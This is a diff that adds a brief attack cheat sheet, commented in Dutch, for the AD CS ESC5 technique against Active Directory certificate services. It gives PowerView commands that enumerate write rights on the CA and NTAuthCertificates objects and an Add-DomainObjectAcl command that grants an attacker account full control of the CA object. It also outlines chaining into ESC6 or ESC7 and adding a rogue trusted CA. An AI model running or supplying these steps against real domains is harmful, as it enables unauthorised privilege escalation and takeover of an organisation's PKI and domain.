@@ -1,0 +1,17 @@
+# AD CS ESC5 - Vulnerable PKI Object Access Control
+# Aanvaller heeft WRITE rechten op PKI objecten buiten templates:
+# CA server object, RootCA cert, NTAuthCertificates, of Enrollment Services container
+# Stap 1: Enumerate PKI object ACLs
+# CA server AD object:
+Get-DomainObjectAcl -Identity "CN=domain-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericAll" }
+# NTAuthCertificates:
+Get-DomainObjectAcl -Identity "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericAll" }
+# Stap 2a: WriteDacl op CA → geef jezelf ManageCA recht → escaleer naar ESC7
+# Stap 2b: WriteOwner op NTAuthCertificates → voeg eigen CA toe als trusted
+# Stap 2c: GenericAll op Enrollment Services → wijzig CA settings
+# Via DACL edit met PowerView:
+Add-DomainObjectAcl -TargetIdentity "CN=domain-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All
+# Stap 3: Afhankelijk van het object, combineer met ESC6 of ESC7
+# Tip: ESC5 is een toegangscontrole-probleem, niet een template-probleem
+# Tip: Check alle PKI objecten in CN=Public Key Services,CN=Services,CN=Configuration
+# Tip: BloodHound 4.x+ toont ADCS relaties — gebruik certipy met -old-bloodhound flag
